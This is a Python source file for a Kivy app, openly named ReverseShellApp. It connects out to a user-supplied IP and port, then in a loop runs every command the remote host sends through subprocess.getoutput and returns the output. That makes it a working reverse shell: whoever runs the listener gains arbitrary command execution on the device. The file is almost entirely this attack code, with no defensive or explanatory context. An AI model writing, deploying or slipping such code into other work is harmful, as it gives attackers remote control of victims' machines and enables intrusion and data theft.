import socket
import subprocess
import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label

class ReverseShellApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')

        self.ip_input = TextInput(hint_text='Server IP', multiline=False)
        self.port_input = TextInput(hint_text='Server Port', multiline=False)
        connect_button = Button(text='Connect', on_press=self.connect_to_server)
        self.status_label = Label(text='')

        layout.add_widget(self.ip_input)
        layout.add_widget(self.port_input)
        layout.add_widget(connect_button)
        layout.add_widget(self.status_label)

        return layout

    def connect_to_server(self, instance):
        server_ip = self.ip_input.text
        server_port = int(self.port_input.text)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            self.status_label.text = 'Connected to server'

            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())

            s.close()
        except Exception as e:
            self.status_label.text = f"Error: {e}"

if __name__ == '__main__':
    ReverseShellApp().run()
